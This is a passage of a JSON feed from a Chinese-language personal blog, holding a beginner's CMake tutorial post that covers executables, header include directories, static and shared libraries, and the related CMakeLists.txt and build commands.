{
    "version": "https://jsonfeed.org/version/1",
    "title": "skyの博客",
    "description": "一只菜狗的博客",
    "home_page_url": "https://3cly.github.io",
    "items": [
        {
            "id": "https://3cly.github.io/2023/03/26/CMake/",
            "url": "https://3cly.github.io/2023/03/26/CMake/",
            "title": "=CMake=",
            "date_published": "2023-03-26T06:38:21.000Z",
            "content_html": "<h1 id=\"cmake-01-basic\"><a class=\"markdownIt-Anchor\" href=\"#cmake-01-basic\">#</a> cmake 01-basic</h1>\n<h2 id=\"什么是cmake\"><a class=\"markdownIt-Anchor\" href=\"#什么是cmake\">#</a> 什么是 cmake</h2>\n<img data-src=\"\\images\\image-20230320003127778.png\" alt=\"image-20230320003127778\" style=\"zoom: 67%;\">\n<p>之前在 linux 虚拟机上安装各种工具或者编译文件时候常用到 cmake, 那么什么是 cmake 呢？</p>\n<p>CMake 是一个跨平台的安装（编译）工具，可以用简单的语句来描述所有平台的安装 (编译过程)。他能够输出各种各样的 makefile 或者 project 文件，CMake 的组态档取名为 CMakeLists.txt。也就是在 CMakeLists.txt 这个文件中写 cmake 代码。接下来就系统的学习一下 cmake 的语法</p>\n<h2 id=\"一hello-cmake\"><a class=\"markdownIt-Anchor\" href=\"#一hello-cmake\">#</a> (一) hello-cmake</h2>\n<h3 id=\"maincpp\"><a class=\"markdownIt-Anchor\" href=\"#maincpp\">#</a> main.cpp</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   std<span class=\"token operator\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Hello CMake!\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token operator\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"cmakeliststxt\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置 CMake 最小版本</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>hello_cmake<span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置工程名</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_cmake main.cpp<span class=\"token punctuation\">)</span> <span class=\"token comment\">#生成可执行文件</span></pre></td></tr></table></figure><p><strong>生成与工程同名的二进制文件的办法</strong></p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">2.6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>hello_cmake<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_NAME</span><span class=\"token punctuation\">&#125;</span> main.cpp<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>project (hello_cmake) 函数执行时会生成一个变量，是 PROJECT_NAME，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mrow><mi>P</mi><mi>R</mi><mi>O</mi><mi>J</mi><mi>E</mi><mi>C</mi><msub><mi>T</mi><mi>N</mi></msub><mi>A</mi><mi>M</mi><mi>E</mi></mrow><mtext>表示</mtext><mi>P</mi><mi>R</mi><mi>O</mi><mi>J</mi><mi>E</mi><mi>C</mi><msub><mi>T</mi><mi>N</mi></msub><mi>A</mi><mi>M</mi><mi>E</mi><mtext>变量的值为</mtext><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><msub><mi>o</mi><mi>c</mi></msub><mi>m</mi><mi>a</mi><mi>k</mi><mi>e</mi><mo separator=\"true\">,</mo><mtext>所以把</mtext></mrow><annotation encoding=\"application/x-tex\">{PROJECT_NAME}表示PROJECT_NAME变量的值为hello_cmake,所以把</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span></span><span class=\"mord cjk_fallback\">表</span><span class=\"mord cjk_fallback\">示</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">c</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mord mathnormal\">e</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">所</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">把</span></span></span></span> {PROJECT_NAME} 用在 add_executable () 里可以生成可执行文件名字叫 hello_cmake</p>\n<h3 id=\"构建-编译和运行\"><a class=\"markdownIt-Anchor\" href=\"#构建-编译和运行\">#</a> 构建、编译和运行</h3>\n<p>构建有外部构建和内部构建两种，推荐使用外部构建，我们可以创建一个可以位于文件系统上任何位置的构建文件夹。 所有临时构建和目标文件都位于此目录中，以保持源代码树的整洁。</p>\n<p>拿本例子来说：</p>\n<p>运行下述代码，新建 build 构建文件夹，并运行 cmake 命令</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> build  新建build构建文件夹</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> build/</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>cmake <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>这时其实可以直接make</pre></td></tr></table></figure><p>构建系统是需要指定 CMakeLists.txt 所在路径，此时在 build 目录下，所以用  <code>..</code>  表示 CMakeLists.txt 在上一级目录。</p>\n<p>此时在 build 目录下会生成 Makefile 文件，然后调用编译器来实际编译和链接项目：</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cmake --build .</pre></td></tr></table></figure><p><code>--build</code>  指定编译生成的文件存放目录，其中就包括可执行文件， <code>.</code>  表示存放到当前目录</p>\n<p><img data-src=\"P:%5CHexo-Blog%5Csource%5Cimages%5Cimage-20230320210319645.png\" alt=\"image-20230320210319645\"></p>\n<p>同时如果点开 build 文件夹就可以看到，build 文件夹下生成了许多二进制文件，如果要从头开始重新创建 cmake 环境，只需删除构建目录 build，然后重新运行 cmake。 所以外部构建非常方便</p>\n<h2 id=\"二hello-headers\"><a class=\"markdownIt-Anchor\" href=\"#二hello-headers\">#</a> (二) hello-headers</h2>\n<h3 id=\"文件树\"><a class=\"markdownIt-Anchor\" href=\"#文件树\">#</a> 文件树</h3>\n<pre><code class=\"language-tree\">├── CMakeLists.txt\n├── include\n│   └── Hello.h\n└── src\n    ├── Hello.cpp\n    └── main.cpp\n</code></pre>\n<h3 id=\"cmakeliststxt-2\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-2\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#最低 CMake 版本</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>hello_headers<span class=\"token punctuation\">)</span><span class=\"token comment\"># 工程名</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token property\">SOURCES</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token comment\">#创建一个变量，名字叫 SOURCE。它包含了所有的 cpp 文件。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_headers <span class=\"token punctuation\">$&#123;</span><span class=\"token property\">SOURCES</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#用所有的源文件生成一个可执行文件，因为这里定义了 SOURCE 变量，所以就不需要罗列 cpp 文件了</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#等价于命令：     add_executable (hello_headers src/Hello.cpp src/main.cpp)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>hello_headers</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token comment\">#设置这个可执行文件 hello_headers 需要包含的库的路径</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#PROJECT_SOURCE_DIR 指工程顶层目录</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#PROJECT_Binary_DIR 指编译目录</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#PRIVATE 指定了库的范围</span></pre></td></tr></table></figure><blockquote>\n<ul>\n<li>PRIVATE - 目录被添加到目标（库）的包含路径中。</li>\n<li>INTERFACE - 目录没有被添加到目标（库）的包含路径中，而是链接了这个库的其他目标（库或者可执行程序）包含路径中</li>\n<li>PUBLIC - 目录既被添加到目标（库）的包含路径中，同时添加到了链接了这个库的其他目标（库或者可执行程序）的包含路径中</li>\n</ul>\n<p>也就是说，根据库是否包含这个路径，以及调用了这个库的其他目标是否包含这个路径，可以分为三种 scope。</p>\n</blockquote>\n<h3 id=\"cmake中的常用的变量一些目录\"><a class=\"markdownIt-Anchor\" href=\"#cmake中的常用的变量一些目录\">#</a> CMake 中的常用的变量 (一些目录)</h3>\n<p>CMake 语法指定了许多变量，可用于在项目或源代码树中找到有用的目录。 其中一些包括：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">Variable</th>\n<th style=\"text-align:left\">Info</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">CMAKE_SOURCE_DIR</td>\n<td style=\"text-align:left\">根源代码目录，工程顶层目录。暂认为就是 PROJECT_SOURCE_DIR</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CMAKE_CURRENT_SOURCE_DIR</td>\n<td style=\"text-align:left\">当前处理的 CMakeLists.txt 所在的路径</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">PROJECT_SOURCE_DIR</td>\n<td style=\"text-align:left\">工程顶层目录</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CMAKE_BINARY_DIR</td>\n<td style=\"text-align:left\">运行 cmake 的目录。外部构建时就是 build 目录</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CMAKE_CURRENT_BINARY_DIR</td>\n<td style=\"text-align:left\">The build directory you are currently in. 当前所在 build 目录</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">PROJECT_BINARY_DIR</td>\n<td style=\"text-align:left\">暂认为就是 CMAKE_BINARY_DIR</td>\n</tr>\n</tbody>\n</table>\n<p>想体会一下，可以在 CMakeLists 中，利用 message（）命令输出一下这些变量。</p>\n<p>另外，这些变量不仅可以在 CMakeLists 中使用，同样可以在源代码.cpp 中使用。</p>\n<h3 id=\"源文件变量不建议这样做\"><a class=\"markdownIt-Anchor\" href=\"#源文件变量不建议这样做\">#</a> 源文件变量 (不建议这样做)</h3>\n<p>回到代码的部分，这里创建了一个包含多个源文件的变量 SOURCES (不建议这样做，可能会导致 glob 命令在添加新的源文件后不会显示正确的结果)</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token property\">SOURCES</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_NAME</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">$&#123;</span><span class=\"token property\">SOURCES</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"包含头文件\"><a class=\"markdownIt-Anchor\" href=\"#包含头文件\">#</a> 包含头文件</h3>\n<p>当您有其他需要包含的文件夹（文件夹里有头文件）时，可以使用以下命令使编译器知道它们： target_include_directories（）。 编译此目标时，这将使用 - I 标志将这些目录添加到编译器中，例如 -I / 目录 / 路径</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>target</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>PRIVATE  标识符指定包含的范围。 这对库很重要。</p>\n</blockquote>\n<p><strong>对于公共的头文件，最好在 include 文件夹下建立子目录。</strong></p>\n<p><strong>传递给函数 target_include_directories () 的目录，应该是所有包含目录的根目录，然后在这个根目录下建立不同的文件夹，分别写头文件。</strong></p>\n<p><strong>这样使用的时候，不需要写 ${PROJECT_SOURCE_DIR}/include，而是直接选择对应的文件夹里对应头文件。下面是例子： <code>#include &quot;static/Hello.h&quot;</code>  而不是 <code>#include &quot;Hello.h&quot;</code>  使用此方法意味着在项目中使用多个库时，头文件名冲突的可能性较小。</strong></p>\n<h2 id=\"三static-library\"><a class=\"markdownIt-Anchor\" href=\"#三static-library\">#</a> （三）Static Library</h2>\n<h3 id=\"cmakeliststxt-3\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-3\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span><span class=\"token punctuation\">(</span>hello_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Create a library</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#库的源文件 Hello.cpp 生成静态库 hello_library</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">STATIC</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>hello_library</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token namespace\">PUBLIC</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># target_include_directories 为一个目标（可能是一个库 library 也可能是可执行文件）添加头文件路径。</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># Create an executable</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># Add an executable with the above sources</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#指定用哪个源文件生成可执行文件</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_binary </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#链接可执行文件和静态库</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> hello_binary</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        hello_library</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#链接库和包含头文件都有关于 scope 这三个关键字的用法。</span></pre></td></tr></table></figure><h4 id=\"创建静态库\"><a class=\"markdownIt-Anchor\" href=\"#创建静态库\">#</a> 创建静态库</h4>\n<p>add_library（）函数用于从某些源文件创建一个库，默认生成在构建文件夹。 写法如下：</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">STATIC</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在 add_library 调用中包含了源文件，用于创建名称为 libhello_library.a 的静态库。</p>\n<h3 id=\"链接库\"><a class=\"markdownIt-Anchor\" href=\"#链接库\">#</a> 链接库</h3>\n<p>创建将使用这个库的可执行文件时，必须告知编译器需要用到这个库。 可以使用 target_link_library（）函数完成此操作。add_executable () 连接源文件，target_link_libraries () 连接库文件。</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_binary</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> hello_binary</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        hello_library</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这告诉 CMake 在链接期间将 hello_library 链接到 hello_binary 可执行文件。 同时，这个被链接的库如果有 INTERFACE 或者 PUBLIC 属性的包含目录，那么，这个包含目录也会被传递（ propagate ）给这个可执行文件。</p>\n<h2 id=\"四shared-library\"><a class=\"markdownIt-Anchor\" href=\"#四shared-library\">#</a> （四）Shared Library</h2>\n<h3 id=\"cmakeliststxt-4\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-4\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">project</span><span class=\"token punctuation\">(</span>hello_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># Create a library</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#根据 Hello.cpp 生成动态库</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">SHARED</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#给动态库 hello_library 起一个别的名字 hello::library</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span><span class=\"token inserted class-name\">hello::library</span> ALIAS hello_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#为这个库目标，添加头文件路径，PUBLIC 表示包含了这个库的目标也会包含这个路径</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">target_include_directories</span><span class=\"token punctuation\">(</span>hello_library</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token namespace\">PUBLIC</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># Create an executable</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#根据 main.cpp 生成可执行文件</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_binary</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#链接库和可执行文件，使用的是这个库的别名。PRIVATE 表示</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> hello_binary</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token inserted class-name\">hello::library</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"创建动态库\"><a class=\"markdownIt-Anchor\" href=\"#创建动态库\">#</a> 创建动态库</h3>\n<p>add_library（）函数用于从某些源文件创建一个动态库，默认生成在构建文件夹。 写法如下：</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td 